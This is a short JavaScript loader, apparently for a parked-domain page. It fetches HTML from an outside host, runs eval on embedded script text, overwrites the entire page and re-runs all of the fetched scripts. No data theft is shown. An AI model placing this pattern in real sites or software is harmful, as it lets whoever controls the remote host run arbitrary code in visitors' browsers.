(function() {
    // Guard against multiple executions
    if (window.__parkedScriptLoaded) return;
    window.__parkedScriptLoaded = true;

    async function loadTailwind() {
        return new Promise((resolve) => {
            const tailwindScript = document.createElement('script');
            tailwindScript.src = 'https://cdn.tailwindcss.com';
            tailwindScript.onload = resolve;
            document.head.appendChild(tailwindScript);
        });
    }

    async function loadContent() {
        try {
            // First load Tailwind
            await loadTailwind();

            // Then fetch the content
            const response = await fetch('https://imarya.lol/content.txt');
            const html = await response.text();
            
            // Create a temporary container to parse the HTML
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            
            // Extract and execute any script configurations first
            const scripts = doc.getElementsByTagName('script');
            for (let script of Array.from(scripts)) {
                if (script.textContent.includes('tailwind.config')) {
                    eval(script.textContent);
                    script.remove();
                }
            }
            
            // Now replace the document content
            document.documentElement.innerHTML = html;
            
            // Re-execute remaining scripts in order
            const remainingScripts = document.getElementsByTagName('script');
            for (let script of Array.from(remainingScripts)) {
                const newScript = document.createElement('script');
                
                // Copy all attributes
                Array.from(script.attributes).forEach(attr => {
                    newScript.setAttribute(attr.name, attr.value);
                });
                
                // Copy content if it's an inline script
                newScript.innerHTML = script.innerHTML;
                
                // Replace the old script with the new one
                script.parentNode.replaceChild(newScript, script);
            }
        } catch (error) {
            console.error('Error loading content:', error);
        }
    }

    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', loadContent);
    } else {
        loadContent();
    }
})();